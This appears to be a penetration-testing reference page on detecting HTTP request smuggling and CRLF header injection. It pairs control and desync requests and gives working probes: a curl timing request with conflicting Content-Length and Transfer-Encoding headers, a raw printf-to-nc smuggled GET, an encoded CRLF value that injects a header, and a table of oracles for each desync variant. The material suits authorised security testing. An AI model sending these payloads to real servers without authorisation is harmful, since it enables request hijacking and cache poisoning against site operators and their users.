# Detection oracle — building the discriminator

## The differential — the paired-probe

Every oracle is a PAIR — a control request and a desync request — the
DIFFERENCE is the signal:

```text
control:  POST / HTTP/1.1 Content-Length: 4 body=A=1
desync:   POST / HTTP/1.1 Content-Length: 4 Transfer-Encoding: chunked
          body=A=1
```

If both return the same → no desync on this route — if the desync
returns different → candidate.

## The timing-oracle — `time` the response

```text
time curl -X POST -H "Content-Length: 6" -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nG' http://t/
```

If the response is delayed vs the control → the back-end is waiting
for the rest of `GPOST` → CL.TE — `detection.md`.

## The status-oracle — the next-response's status

```text
POST / [desync: GET /404]  →  GET /  →  the GET returns 404
```

The next normal request returns the smuggle's 404 → TE.CL — the
status-delta.

## The response-count — `nc` one socket

```bash
printf 'POST / HTTP/1.1\r\nHost: t\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGGET / HTTP/1.1\r\nHost: t\r\n\r\n' | nc t 80
```

Count the status lines — TWO `HTTP/1.1` responses for one POST → the
back-end answered a request the front never sent → desync.

## The marker-echo — the smuggle's marker

```text
POST / [desync: GET /search?q=MARKER]  →  GET /search?q=x
```

The next response echoes `MARKER` → the smuggle ran — `response-poisoning.md`.

## The header-oracle — the injected header appears

```text
?host=x%0d%0aX-Injected:%201
```

If the response or a follow-up observation carries `X-Injected` — the
fold landed — `crlf-injection.md`.

## The body-length oracle — the response's `Content-Length`

The smuggle's response has a different `Content-Length` than the
normal response — the shifted-queue.

## The negative-controls — what proves NO desync

- the same response to control and desync
- a 400 on the malformed request — parser-error
- `Connection: close` — no shared socket
- `%0d%0a` filtered/encoded — no fold

## The oracle-table — which signal for which pair

| Pair | Oracle |
|---|---|
| CL.TE | hang/timeout on `0\r\n\r\nG` |
| TE.CL | next-request 404 |
| TE.TE | obfuscation-dependent |
| CL.CL | dup-CL differential |
| CL.0 | body-ignored → next-request smuggle |
| H2.CL | h2 `content-length` mistranslate |
| fold | injected-header echo |
